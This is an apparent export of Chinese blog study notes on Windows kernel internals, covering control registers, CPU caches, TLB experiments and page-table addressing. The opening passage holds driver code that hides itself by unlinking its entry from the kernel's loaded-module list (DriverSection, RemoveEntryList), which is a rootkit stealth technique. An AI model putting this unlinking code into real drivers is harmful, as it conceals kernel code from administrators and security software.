引用计数清除</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;DriverHide ObReferenceObjectByName Failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;-----------DriverUnload-----------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 断链隐藏自身</span></span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS status = <span class="built_in">PsCreateSystemThread</span>(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, DriverHide, <span class="string">&quot;\\drivers\\MyDriver3&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">NtClose</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有BUG</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DbgBreakPoint();</span></span><br><span class="line"><span class="comment">PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span></span><br><span class="line"><span class="comment">PKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink;</span></span><br><span class="line"><span class="comment">PKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">UNICODE_STRING usDriverName1 = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">RtlInitUnicodeString(&amp;usDriverName1, L&quot;\\drivers\\http&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">UNICODE_STRING usDriverName = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">RtlInitUnicodeString(&amp;usDriverName, L&quot;http.sys&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">while (next != pre)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">// DbgPrintEx(77, 0, &quot;[db]: Driver Name = %wZ\r\n&quot;, &amp;next-&gt;FullDllName);</span></span><br><span class="line"><span class="comment">if (next-&gt;BaseDllName.Length != 0 &amp;&amp; RtlCompareUnicodeString(&amp;usDriverName, &amp;next-&gt;BaseDllName, TRUE) == 0)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">PDRIVER_OBJECT pDriverObject = NULL;</span></span><br><span class="line"><span class="comment">NTSTATUS status = ObReferenceObjectByName(&amp;usDriverName1, FILE_ALL_ACCESS, 0, 0, IoDriverObjectType, KernelMode, NULL, &amp;pDriverObject);</span></span><br><span class="line"><span class="comment">if (NT_SUCCESS(status))</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">pDriverObject-&gt;DriverInit = NULL;</span></span><br><span class="line"><span class="comment">pDriverObject-&gt;DriverSection = NULL;</span></span><br><span class="line"><span class="comment">// pDriverObject-&gt;Type = 0;// 规避暴露搜索</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">DbgPrintEx(77, 0, &quot;DriverHide ObReferenceObjectByName Failed&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">DbgPrintEx(77, 0, &quot;[db]: Driver Name = %wZ\r\n&quot;, &amp;next-&gt;FullDllName);</span></span><br><span class="line"><span class="comment">RemoveEntryList(&amp;next-&gt;InLoadOrderLinks);</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">next = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-控制寄存器</title>
      <link href="/fefdec16.html"/>
      <url>/fefdec16.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>控制寄存器</strong></p></div><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="CR2"><a href="#CR2" class="headerlink" title="CR2"></a>CR2</h3><blockquote><p>CR2寄存器（内存有问题）保存了出异常的线性地址;</p></blockquote><h3 id="CR3"><a href="#CR3" class="headerlink" title="CR3"></a>CR3</h3><h4 id="PCD"><a href="#PCD" class="headerlink" title="PCD"></a>PCD</h4><blockquote><p>当PCD位为1的时候, 整个页表的缓存全关;</p></blockquote><h4 id="PWT"><a href="#PWT" class="headerlink" title="PWT"></a>PWT</h4><blockquote><p>当PWT位为1的时候, 代表只写（优化性能）;</p></blockquote><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><h4 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h4><blockquote><p>开启保护模式, 但是没有分页保护, 只有段保护;</p></blockquote><h4 id="PG"><a href="#PG" class="headerlink" title="PG"></a>PG</h4><blockquote><p>开启分页模式;</p></blockquote><blockquote><p>PE和PG组合<br>PE &#x3D; 0, PG &#x3D; 1 &#x3D;&gt; 错误的<br>PE &#x3D; 0, PG &#x3D; 0 &#x3D;&gt; 正确的（实模式）<br>PE &#x3D; 1, PG &#x3D; 0 &#x3D;&gt; 正确的（段模式）<br>PE &#x3D; 1, PG &#x3D; 1 &#x3D;&gt; 正确的（段页模式）</p></blockquote><h4 id="CD"><a href="#CD" class="headerlink" title="CD"></a>CD</h4><blockquote><p>关闭缓存; 如果CD位为1, 所有进程的页表缓存通通关闭;</p></blockquote><h4 id="AM"><a href="#AM" class="headerlink" title="AM"></a>AM</h4><blockquote><p>当AM位置为1时, 三环的应用程序必须经过对齐检查（堆栈在32位下必须是4字节对齐, 在64位下必须是8字节对齐）</p></blockquote><h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><blockquote><p>关闭写保护, 不可写的地址变为可写;</p></blockquote><h3 id="CR4"><a href="#CR4" class="headerlink" title="CR4"></a>CR4</h3><h4 id="VME"><a href="#VME" class="headerlink" title="VME"></a>VME</h4><blockquote><p>开启虚拟中断, 并且允许开启虚拟8086模式;</p></blockquote><h4 id="PVI"><a href="#PVI" class="headerlink" title="PVI"></a>PVI</h4><blockquote><p>当PVI位为1时, 允许虚拟8086模式支持虚拟化中断;</p></blockquote><h4 id="TSD"><a href="#TSD" class="headerlink" title="TSD"></a>TSD</h4><blockquote></blockquote><h4 id="DE"><a href="#DE" class="headerlink" title="DE"></a>DE</h4><blockquote></blockquote><h4 id="PSE"><a href="#PSE" class="headerlink" title="PSE"></a>PSE</h4><blockquote><p>当PSE位为0时, 就算PDE.ps &#x3D; 1也是小页; 控制所有大页的开关是否有效</p></blockquote><h4 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h4><blockquote><p>在32位下, 如果PAE位为1, 表示分页模式为2-9-9-12模式; 否则为10-10-12模式;</p></blockquote><h4 id="MCE"><a href="#MCE" class="headerlink" title="MCE"></a>MCE</h4><blockquote><p>机器检查</p></blockquote><h4 id="PGE"><a href="#PGE" class="headerlink" title="PGE"></a>PGE</h4><blockquote><p>如果PGE &#x3D; 1, G &#x3D; 1代表全局页有效; 如果PGE &#x3D; 0, G &#x3D; 1代表无效;</p></blockquote><h4 id="PCE"><a href="#PCE" class="headerlink" title="PCE"></a>PCE</h4><blockquote></blockquote><h4 id="VMXE"><a href="#VMXE" class="headerlink" title="VMXE"></a>VMXE</h4><blockquote><p>VT的开启位, 进入VT之后这个位必须为1</p></blockquote><h4 id="SMXE"><a href="#SMXE" class="headerlink" title="SMXE"></a>SMXE</h4><blockquote><p>上帝模式</p></blockquote><h4 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h4><blockquote><p>super mode execute protected</p></blockquote><h4 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h4><blockquote><p>super mode access protected</p></blockquote><h4 id="PKE"><a href="#PKE" class="headerlink" title="PKE"></a>PKE</h4><blockquote><p>页表密钥</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-缓存</title>
      <link href="/b89f0cae.html"/>
      <url>/b89f0cae.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>缓存</strong></p></div><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="WC（写组合-写合并）"><a href="#WC（写组合-写合并）" class="headerlink" title="WC（写组合&#x2F;写合并）"></a>WC（写组合&#x2F;写合并）</h3><blockquote><p>同一时刻只能保证4个地址; </p></blockquote><h3 id="WB（写回绕-回写）"><a href="#WB（写回绕-回写）" class="headerlink" title="WB（写回绕&#x2F;回写）"></a>WB（写回绕&#x2F;回写）</h3><blockquote></blockquote><h3 id="WT（直写）"><a href="#WT（直写）" class="headerlink" title="WT（直写）"></a>WT（直写）</h3><blockquote><p>通常是做多媒体</p></blockquote><h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><blockquote><p>课程中test1比test2快, 实验是test2比test1快???</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_19_Cache(缓存).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOCATE_SIZE 0x10000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MASK (ALLOCATE_SIZE - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PUCHAR x1 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x2 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x3 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x4 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x5 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x6 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> startTime = <span class="built_in">GetTickCount</span>();</span><br><span class="line"><span class="type">int</span> i = INT_MAX;</span><br><span class="line"><span class="keyword">while</span> (i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index = i &amp; MASK;</span><br><span class="line"><span class="type">char</span> b = i;</span><br><span class="line">x1[index] = b;</span><br><span class="line">x2[index] = b;</span><br><span class="line">x3[index] = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> j = INT_MAX;</span><br><span class="line"><span class="keyword">while</span> (j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index = j &amp; MASK;</span><br><span class="line"><span class="type">char</span> b = j;</span><br><span class="line">x4[index] = b;</span><br><span class="line">x5[index] = b;</span><br><span class="line">x6[index] = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> endTime = <span class="built_in">GetTickCount</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. 一共耗时%d毫秒\r\n&quot;</span>, endTime - startTime);</span><br><span class="line"><span class="built_in">free</span>(x1);</span><br><span class="line"><span class="built_in">free</span>(x2);</span><br><span class="line"><span class="built_in">free</span>(x3);</span><br><span class="line"><span class="built_in">free</span>(x4);</span><br><span class="line"><span class="built_in">free</span>(x5);</span><br><span class="line"><span class="built_in">free</span>(x6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PUCHAR x1 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x2 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x3 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x4 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x5 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line">PUCHAR x6 = (PUCHAR)<span class="built_in">malloc</span>(ALLOCATE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> startTime = <span class="built_in">GetTickCount</span>();</span><br><span class="line"><span class="type">int</span> i = INT_MAX;</span><br><span class="line"><span class="keyword">while</span> (i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index = i &amp; MASK;</span><br><span class="line"><span class="type">char</span> b = i;</span><br><span class="line">x1[index] = b;</span><br><span class="line">x2[index] = b;</span><br><span class="line">x3[index] = b;</span><br><span class="line">x4[index] = b;</span><br><span class="line">x5[index] = b;</span><br><span class="line">x6[index] = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> endTime = <span class="built_in">GetTickCount</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. 一共耗时%d毫秒\r\n&quot;</span>, endTime - startTime);</span><br><span class="line"><span class="built_in">free</span>(x1);</span><br><span class="line"><span class="built_in">free</span>(x2);</span><br><span class="line"><span class="built_in">free</span>(x3);</span><br><span class="line"><span class="built_in">free</span>(x4);</span><br><span class="line"><span class="built_in">free</span>(x5);</span><br><span class="line"><span class="built_in">free</span>(x6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">test1</span>();</span><br><span class="line"><span class="built_in">test2</span>();</span><br><span class="line"><span class="built_in">test1</span>();</span><br><span class="line"><span class="built_in">test2</span>();</span><br><span class="line"><span class="built_in">test1</span>();</span><br><span class="line"><span class="built_in">test2</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PAT"><a href="#PAT" class="headerlink" title="PAT"></a>PAT</h3><h2 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h2><blockquote><p>每个核有4个TLB, 2个数据核（dTLB）, 2个指令TLB（iTLB）;</p></blockquote><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li>申请2个地址, 分别赋值;</li><li>把第一个地址挂在0地址上, 然后访问, 取出结果保存变量;</li><li>又把第二个地址挂在0地址上, 然后访问, 取出结果也保存变量;</li><li>观察变量1, 变量2有什么不同;</li></ol><blockquote><p>401080<br>gdtr: 0040ec00&#96;00081080</p></blockquote><h3 id="实验代码-1"><a href="#实验代码-1" class="headerlink" title="实验代码"></a>实验代码</h3><blockquote><p>代码出现问题, 获取0地址时为0;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_21_TLB.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PUCHAR addr1 = <span class="literal">NULL</span>;</span><br><span class="line">PUCHAR addr2 = <span class="literal">NULL</span>;</span><br><span class="line">ULONG temp1 = <span class="number">0</span>, temp2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>  __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">pushad;</span><br><span class="line">pushfd;</span><br><span class="line">push <span class="number">0x30</span>;</span><br><span class="line">pop fs;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov eax, [addr1]; <span class="comment">// 线形地址1, 使用原始汇编代码, 注释代码会导致系统蓝屏</span></span><br><span class="line">shr eax, <span class="number">0x9</span>;</span><br><span class="line"><span class="keyword">and</span> eax, <span class="number">0x7ffff8</span>;</span><br><span class="line">mov ecx, [eax<span class="number">-0x3FFFFFFC</span>];</span><br><span class="line">sub eax, <span class="number">0x40000000</span>;</span><br><span class="line">mov ecx, [eax];</span><br><span class="line">mov edx, [eax + <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//and eax, 0xC0000000;</span></span><br><span class="line"><span class="comment">//int 3;</span></span><br><span class="line"><span class="comment">//mov ecx, [eax];// 取低4字节</span></span><br><span class="line"><span class="comment">//mov edx, [eax + 4];// 取高4字节</span></span><br><span class="line"></span><br><span class="line">mov dword ptr ds:[<span class="number">0xC0000000</span>], ecx;</span><br><span class="line">mov dword ptr ds:[<span class="number">0xC0000004</span>], edx;</span><br><span class="line">mov eax, dword ptr ds:[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">mov [temp1], eax;</span><br><span class="line"></span><br><span class="line">mov eax, cr3;<span class="comment">//刷新cr3</span></span><br><span class="line">mov cr3, eax;<span class="comment">// 刷新cr3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mov eax, [addr2]; // 线形地址2</span></span><br><span class="line"><span class="comment">//shr eax, 0x9;</span></span><br><span class="line"><span class="comment">//and eax, 0x7ffff8;</span></span><br><span class="line"><span class="comment">//and eax, 0xC0000000;</span></span><br><span class="line"><span class="comment">//mov ecx, [eax];// 取低4字节</span></span><br><span class="line"><span class="comment">//mov edx, [eax + 4];// 取高4字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mov dword ptr ds : [0xC0000000], ecx;</span></span><br><span class="line"><span class="comment">//mov dword ptr ds : [0xC0000004], edx;</span></span><br><span class="line"><span class="comment">//mov eax, dword ptr ds : [0];</span></span><br><span class="line"><span class="comment">//mov [temp2], eax;</span></span><br><span class="line"></span><br><span class="line">push <span class="number">0x3b</span>;</span><br><span class="line">pop fs;</span><br><span class="line">popfd;</span><br><span class="line">popad;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">addr1 = (PUCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">addr2 = (PUCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">*(PUCHAR)addr1 = <span class="number">0x1000</span>;</span><br><span class="line">*(PUCHAR)addr2 = <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">temp1 = <span class="number">0</span>;</span><br><span class="line">temp2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;addr1 = %x, addr2 = %x, test = %x\r\n&quot;</span>, addr1, addr2, test);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4b</span>,<span class="number">0</span> &#125;;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// push fs;</span></span><br><span class="line">call fword ptr bufcode;</span><br><span class="line"><span class="comment">// pop fs;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;temp1 = %x, temp2 = %x\r\n&quot;</span>, temp1, temp2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="刷新CR3"><a href="#刷新CR3" class="headerlink" title="刷新CR3"></a>刷新CR3</h3><blockquote><ol><li>当切换CR3的时候, CPU就认为在切换不同的页表; 当页表发生变化的时候, TLB就会产生一个刷新; 凡是G位等于0的通通刷新掉; 刷新除G位为1的情况;<br>切换线程的时候, 判断当前被切换与切换是否是一个进程, 如果不是, 会切换页表（CR3）;</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, cr3;<span class="comment">//刷新cr3</span></span><br><span class="line">mov cr3, eax;<span class="comment">// 刷新cr3</span></span><br></pre></td></tr></table></figure><blockquote><ol start="2"><li>把地址变为无效缓存; 刷新一条</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invlpg dword ptr ds:[<span class="number">0</span>];<span class="comment">// 强制刷新TLB中某一行</span></span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>CR4控制寄存器中有一个PGE位, 这个是控制所有的G位是否有效; 刷新所有;</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-页下</title>
      <link href="/2d7503f2.html"/>
      <url>/2d7503f2.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>页表基址</strong></p></div><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><blockquote><p>线性地址和物理地址是一对一映射关系, 等价映射;</p></blockquote><blockquote><p>每个进程在高地址中有4兆空间是不共享的, 他指向的是本进程的PDE和PTE;</p></blockquote><blockquote><p>判断一个线性地址是否有效？</p></blockquote><ol><li>如果是PDE.p &#x3D; 1并且PS&#x3D;1, 那么有效</li><li>如果PDE.p&#x3D;1 PS&#x3D;0, PTE.p&#x3D;1 PTE.PAT&#x3D;0, 有效</li></ol><h3 id="101012下页表基址计算"><a href="#101012下页表基址计算" class="headerlink" title="101012下页表基址计算"></a>101012下页表基址计算</h3><ul><li>汇编代码<blockquote><p>MiIsAddressValid（线性地址有效性验证函数）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0048</span>DBB8                 mov     eax, ecx</span><br><span class="line">.text:<span class="number">0048</span>DBBA                 shr     eax, <span class="number">14</span>h        ; 右移动 <span class="number">20</span>位 eax &gt;&gt; <span class="number">20</span></span><br><span class="line">.text:<span class="number">0048</span>DBBD                 <span class="keyword">and</span>     eax, <span class="number">0F</span>FCh      